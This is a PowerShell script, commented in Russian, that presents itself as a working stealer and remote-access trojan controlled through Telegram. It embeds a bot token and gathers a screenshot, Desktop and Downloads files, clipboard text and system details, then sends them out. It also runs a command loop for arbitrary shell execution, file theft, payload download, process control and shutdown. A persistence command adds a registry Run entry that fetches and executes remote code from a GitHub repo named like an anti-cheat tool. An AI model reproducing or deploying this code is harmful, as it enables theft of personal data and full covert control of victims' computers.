# =========================================================
#         СТИЛЕР + RAT (Telegram) — РАБОЧАЯ ВЕРСИЯ
# =========================================================

$botToken = "8881672889:AAH33jbmgtt-jbgHhe7DbjC7AGLEE4Y8FdM"
$chatId   = "8082708835"
$archivePass = "12345"

# ---- Отправка сообщения ----
function Send-Telegram {
    param($text, $file = $null)
    if ($file) {
        $uri = "https://api.telegram.org/bot$botToken/sendDocument"
        $boundary = [System.Guid]::NewGuid().ToString()
        $body = "--$boundary`r`n"
        $body += "Content-Disposition: form-data; name=`"chat_id`"`r`n`r`n$chatId`r`n"
        $body += "--$boundary`r`n"
        $body += "Content-Disposition: form-data; name=`"document`"; filename=`"$([System.IO.Path]::GetFileName($file))`"`r`n"
        $body += "Content-Type: application/octet-stream`r`n`r`n"
        $bytes = [System.IO.File]::ReadAllBytes($file)
        $body += [System.Text.Encoding]::UTF8.GetString($bytes)
        $body += "`r`n--$boundary--"
        $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
        try {
            Invoke-RestMethod -Uri $uri -Method Post -Body $body -Headers $headers -ErrorAction Stop | Out-Null
        } catch {
            # Если не отправилось – пробуем второй способ
            $web = New-Object System.Net.WebClient
            $web.UploadFile($uri, $file) | Out-Null
        }
        return
    }
    $uri = "https://api.telegram.org/bot$botToken/sendMessage"
    $body = @{ chat_id = $chatId; text = $text }
    try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
    } catch {
        # Игнорируем
    }
}

# ---- Сбор данных ----
function Collect-Stuff {
    $tempDir = "$env:TEMP\stol_$([System.IO.Path]::GetRandomFileName())"
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    # Скриншот
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction Stop
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $bmp.Save("$tempDir\screen.png")
        $g.Dispose(); $bmp.Dispose()
    } catch {}

    # Файлы с рабочего стола и загрузок (первые 20 файлов)
    $folders = @([Environment]::GetFolderPath("Desktop"), [Environment]::GetFolderPath("Downloads"))
    foreach ($fd in $folders) {
        if (Test-Path $fd) {
            Get-ChildItem $fd -File -ErrorAction SilentlyContinue | Select-Object -First 20 | ForEach-Object {
                Copy-Item $_.FullName -Destination $tempDir -Force -ErrorAction SilentlyContinue
            }
        }
    }

    # Буфер обмена
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        $clip = [System.Windows.Forms.Clipboard]::GetText()
        if ($clip) { $clip | Out-File "$tempDir\clipboard.txt" }
    } catch {}

    # Инфо о системе
    $sys = @"
Host: $env:COMPUTERNAME
User: $env:USERNAME
OS: $((Get-WmiObject -Class Win32_OperatingSystem).Caption)
IP: $((Invoke-WebRequest -Uri "http://ipinfo.io/ip" -UseBasicParsing).Content.Trim())
"@
    $sys | Out-File "$tempDir\sys.txt"

    # Архив
    $zipPath = "$env:TEMP\data.zip"
    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
    } else {
        # fallback – просто отправим папку как есть (не будет работать, если нет архиватора)
        Send-Telegram -file $tempDir
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
        return
    }

    # Отправка
    Send-Telegram -file $zipPath

    # Очистка
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
}

# ---- RAT (управление) ----
function Start-RAT {
    Send-Telegram "✅ RAT запущен на $env:COMPUTERNAME ($env:USERNAME)"
    $lastId = 0
    while ($true) {
        try {
            $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$($lastId+1)&timeout=10"
            $resp = Invoke-RestMethod -Uri $url -ErrorAction SilentlyContinue
            if ($resp.ok -and $resp.result) {
                foreach ($upd in $resp.result) {
                    $lastId = $upd.update_id
                    $msg = $upd.message.text
                    if ($msg -and $upd.message.chat.id -eq $chatId) {
                        if ($msg -match "^/cmd (.+)") {
                            $cmd = $matches[1]
                            $out = & cmd.exe /c $cmd 2>&1 | Out-String
                            if (-not $out) { $out = "OK (нет вывода)" }
                            Send-Telegram -text "📟 $out"
                        }
                        elseif ($msg -eq "/screenshot") {
                            try {
                                Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction Stop
                                $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                                $b = New-Object System.Drawing.Bitmap $s.Width, $s.Height
                                $g = [System.Drawing.Graphics]::FromImage($b)
                                $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size)
                                $p = "$env:TEMP\sc_$(Get-Random).png"
                                $b.Save($p)
                                $g.Dispose(); $b.Dispose()
                                Send-Telegram -file $p
                                Remove-Item $p -Force -ErrorAction SilentlyContinue
                            } catch { Send-Telegram -text "❌ Ошибка скриншота" }
                        }
                        elseif ($msg -match "^/upload (.+)") {
                            $path = $matches[1]
                            if (Test-Path $path) { Send-Telegram -file $path } else { Send-Telegram -text "❌ Файл не найден" }
                        }
                        elseif ($msg -match "^/download (.+?) (.+)") {
                            $url2 = $matches[1]; $out2 = $matches[2]
                            try {
                                (New-Object Net.WebClient).DownloadFile($url2, $out2)
                                Send-Telegram -text "✅ Скачан в $out2"
                            } catch { Send-Telegram -text "❌ Ошибка: $_" }
                        }
                        elseif ($msg -match "^/kill (.+)") {
                            try { Stop-Process -Name $matches[1] -Force; Send-Telegram -text "☠️ Убит $($matches[1])" } catch { Send-Telegram -text "❌ Не удалось" }
                        }
                        elseif ($msg -match "^/start (.+)") {
                            try { Start-Process $matches[1]; Send-Telegram -text "▶️ Запущен $($matches[1])" } catch { Send-Telegram -text "❌ Ошибка" }
                        }
                        elseif ($msg -eq "/persist") {
                            $path = "powershell.exe -c `"irm https://raw.githubusercontent.com/MCSuportTeam/CheatCheckerByAntiCheatTeam/refs/heads/main/test.ps1 | iex`""
                            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value $path -Force
                            Send-Telegram -text "💾 Добавлено в автозагрузку"
                        }
                        elseif ($msg -eq "/shutdown") { Send-Telegram -text "🛑 Выключение"; Stop-Computer -Force }
                        elseif ($msg -eq "/restart") { Send-Telegram -text "🔄 Перезагрузка"; Restart-Computer -Force }
                        elseif ($msg -eq "/lock") { rundll32.exe user32.dll,LockWorkStation; Send-Telegram -text "🔒 Заблокировано" }
                        elseif ($msg -eq "/help") {
                            $help = @"
Доступно:
/cmd <команда> – выполнить в CMD
/screenshot – скрин
/upload <путь> – забрать файл
/download URL путь – скачать на ПК
/kill <имя> – убить процесс
/start <имя> – запустить
/persist – добавить в автозагрузку
/shutdown – выключить
/restart – перезагрузить
/lock – блокировка
/help – эта справка
"@
                            Send-Telegram -text $help
                        }
                    }
                }
            }
        } catch {}
        Start-Sleep -Seconds 3
    }
}

# ---- Запуск ----
Collect-Stuff
Start-RAT
